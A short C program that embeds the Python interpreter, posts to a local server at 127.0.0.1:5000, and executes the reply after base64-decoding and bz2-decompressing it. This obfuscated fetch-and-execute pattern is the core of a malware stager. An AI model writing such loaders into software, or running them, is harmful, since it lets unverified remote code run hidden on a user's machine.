/** Documentation
 *
 * https://docs.python.org/2/c-api/
 */
#include <stdlib.h>
#include <Python.h>
#include "http.h"
#include "text.h"
#include "const.h"

int main(int argc, char *argv[]) {
	TEXT output = malloc(1);
	if (NULL == output) {
		ELOG("cannot create temporary file");
		return 1;
	}
	http_init();
	http_post("https://127.0.0.1:5000/_", "modname=_", &output);
	TEXT script = txt_init("import bz2, base64\n");
	txt_cat(script, "exec(bz2.decompress(base64.b64decode(\"");
	txt_cat(script, output);
	txt_cat(script, "\")))\n");
	Py_SetProgramName("");
	Py_InitializeEx(1); // skip signal handler registration
	PySys_SetArgvEx(argc, argv, 0);
	int result = PyRun_SimpleString(script);
	Py_Finalize();
	http_end();
	return result;
}

